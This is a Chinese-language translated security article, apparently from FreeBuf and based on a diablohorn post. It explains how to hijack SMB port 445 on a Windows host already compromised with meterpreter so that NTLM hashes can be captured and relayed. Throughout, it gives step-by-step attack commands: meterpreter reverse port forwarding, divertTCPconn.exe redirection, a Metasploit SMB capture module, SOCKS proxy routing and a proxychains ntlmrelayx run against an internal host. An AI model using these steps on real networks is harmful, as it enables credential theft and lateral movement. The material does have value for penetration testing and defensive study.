@@ -1,0 +1,143 @@
+![1.png](https://image.3001.net/images/20180910/1536516548_5b9561c4c107a.png!small)
+
+## 写在前面的话
+
+ **劫持445端口来执行中继攻击或Hash-Capturing攻击已经是一种经常会出现的攻击方式了，当你使用meterpreter感染目标设备时，你如何监听445端口呢？就在几周之前，这个话题再次浮出了水面。但实际上，现有的工具早就已经解决了这个问题了，只不过很少有人知道罢了…**
+
+在这篇文章中，我们将介绍如何利用这些工具来对目标设备执行中继攻击。这种技术的好处就在于，我们不需要在受感染的主机上使用python2exe或整个Python栈，我们只需要使用简单的驱动器和meterpreter就可以实现目标。
+
+请注意，为了方便演示，我们这里把所有的文件都放在了目标主机的磁盘中，如果你在实际操作中不想这样的话，你可以使用RAM磁盘解决方案或扩展当前的meterpreter内存执行功能来实现自己的目标。除此之外，你还可以采用静态编译等方法来捆绑额外的DLL文件。
+
+### 端口445的“主人”是谁？
+
+首先，我们需要知道主机中哪一个服务或进程负责监听端口445。一般来说，在解决这种类型的问题时我喜欢先上网搜索一番，如果有人已经回答过这些问题的话，我们就可以直接在系统上手动验证并复制解决方案了。所以我直接Google了以下内容：
+
+    
+    
+    msdnprocess listening port 445
+
+下面这两篇文章是我觉得比较有价值的：
+
+> 1\. <https://msdn.microsoft.com/en-us/library/cc875824.aspx>
+>
+> 2\. <https://support.microsoft.com/en-us/help/832017/service-overview-and-> network-port-requirements-for-windows>
+
+根据上述文章提供的内容，我进行了一系列测试，并通过启用和禁用服务来判断该服务是否负责监听445端口，结果我就发现了Server服务。但是这个服务并不会给我们带来立竿见影的效果，因为它需要重启设备才能完成我们的操作，显然这不是真正可行的解决方案。因为理想情况下，我们并不想重启受感染的设备。
+
+深入分析并查看该服务的相关属性之后，我们就可以找到启用该服务的命令：
+
+    
+    
+    C:\WINDOWS\system32\svchost.exe-k netsvcs -p
+
+如果你想深入了解svchost.exe的命令行参数，我建议你访问Geoff
+Chappell的网站：【[传送门](https://www.geoffchappell.com/studies/windows/win32/services/svchost/index.htm)】
+
+如果我们导航到文章上述所介绍的注册表键：
+
+    
+    
+    HKEY_LOCAL_MACHINE\Software\Microsoft\WindowsNT\CurrentVersion\Svchost
+
+我们将看到大量的捆绑服务，但这也并没有完全解决我们的问题，所以我们需要另辟蹊径。这里我找到了一篇关于EternalBlue漏洞利用的文章，这里面提到了[漏洞利用分析和Windows
+10端口](https://jennamagius.keybase.pub/EternalBlue_RiskSense-Exploit-Analysis-and-Port-to-Microsoft-Windows-10.pdf)的相关内容：srv.sys驱动器和某些需要与该驱动器协同工作的驱动器都会涉及到SMB协议。最后，为了得到最终的确认，我们还找到了这篇文章：【
+[传送门](https://docs.microsoft.com/en-us/windows-hardware/drivers/network/network-direct-kernel-programming-interface%E2%80%93ndkpi-)】
+
+现在，我们了解到了负责处理程序与端口445通信的代码位于内核中，这对于我们来说绝对是一个坏消息，因为劫持socket的难度非常大。接下来，我们会介绍如何劫持和重定向端口445。
+
+## 端口445的劫持与重定向
+
+既然我们已经知道了端口445的“主人”存在于内核中，我们就可以开始设计我们的攻击策略了。首先，我想到的就是使用Linux的iptables来劫持传入或传出的连接数据，因为它所做的工作属于的是网络栈中的底层部分。为了弄清楚这种方法能否应用到Windows中，我们需要看一看Windows防火墙的内部工作原理：
+
+> 1、 Windows防火墙架构：【[传送门](https://technet.microsoft.com/pt-> pt/library/cc755604\(v=ws.10\).aspx)】
+>
+> 2、 Windows过滤器平台概览：【[传送门](https://docs.microsoft.com/en-us/windows-> hardware/drivers/network/windows-filtering-platform-architecture-overview)】
+
+这里我们需要创建一个专门的驱动程序，你可能会认为netsh端口重定向技术可能会有用，但其实不然。虽然创建一个驱动程序听起来似乎并不是最理想的解决方案，但如果你搜索类似wfp端口连接之类的相关内容，你就会发现答案@agsolino已经给出了，接下来我们一起看一看如何利用meterpreter和上述技术来重定向目标系统端口445的连接。下图显示的是整个技术的工作机制：
+
+  
+![2.png](https://image.3001.net/images/20180910/1536516580_5b9561e4bc3dd.png!small)  
+
+我们可以看到，我们已经得到了一台感染了meterpreter的主机，利用这个meterpreter，我们可以设置一个反向端口转发，然后在我们的主机上通过端口4444来接收meterpreter连接。远程监听端口8445（meterpreter）将接收来自端口445的连接数据，从而劫持来自445的连接，并将它们转发到metasploit。接下来，我们通过劫持某些凭证来看看如何劫持Windows
+445端口：
+
+1\. 设置一个可用的拥有管理员权限的meterpreter会话；
+
+2\. 设置一个SMB捕捉服务器：
+
+> a) 使用auxiliary/scanner/smb/smb_login
+>
+> b) 设置SRVPORT 9445
+>
+> c) 运行-j
+
+3\. 设置一个meterpreter反向转发端口：
+
+    
+    
+    portfwdadd -R -L 127.0.0.1 -l 9445 -p 8445
+
+4\. 设置端口445劫持：
+
+    
+    
+    divert TCPConn.exe 445 8445
+
+现在，当目标主机连接到受感染主机的445端口之后，你将会在你的metasploit控制台中接收到哈希：
+
+  
+![3.png](https://image.3001.net/images/20180910/1536516606_5b9561fe84643.png!small)  
+
+接下来，我们一起看一看远程NTLM中继攻击的完整实现机制。
+
+## 如何通过meterpreter实现SMB中继攻击
+
+现在，我们将在Ubuntu系统中使用ntlmrelayx，中继设备为目标系统中的某个系统。这里涉及到通过meterpreter来转发正向和反向流量，反向连接用于确保目标网络内的主机能够跟受感染主机完成连接，这里需要用到ntlmrelayx，与目标网络的连接需要涉及到SOCKS代理。下图显示的是整个攻击流程：
+
+  
+![4.png](https://image.3001.net/images/20180910/1536516624_5b956210c9fbe.png!small)  
+
+第一步跟之前的图片类似，这里将设置我们的反向信道：
+
+1\. 设置一个可用的拥有管理员权限的meterpreter会话
+
+2\. 设置一个meterpreter反向端口转发：
+
+    
+    
+    portfwd add -R -p 4445 -l 445 -L 127.0.0.1
+
+3\. 通过meterpreter进行端口445劫持：
+
+    
+    
+    execute-f divertTCPconn.exe -a '445 4445'
+
+为了设置转发信道，我们通过meterpreter会话听加了一个路由来重定向流量，并设置SOCKS代理：
+
+1\. 通过meterpreter添加路由，这里需要指定IP地址：
+
+    
+    
+    route add 192.168.222.103/32 3
+
+2\. 设置SOCKS代理：
+
+> a) 使用auxiliary/server/socks4a
+>
+> b) run
+>
+> c) 确保/etc/proxychains.conf中指定了SOCKS端口（默认1080）
+
+3\. 通过SOCK运行ntlmrelayx：
+
+    
+    
+    sudo proxychains ntlmrelayx.py -t smb://192.168.222.103 -smb2support
+
+下图为运行结果：
+
+![5.png](https://image.3001.net/images/20180910/1536516669_5b95623d4ebb8.png!small)
+
+ ***参考来源：[diablohorn](https://diablohorn.com/2018/08/25/remote-ntlm-relaying-through-meterpreter-on-windows-port-445/)，FB小编Alpha_h4ck编译，转载请注明来自FreeBuf.COM**
+
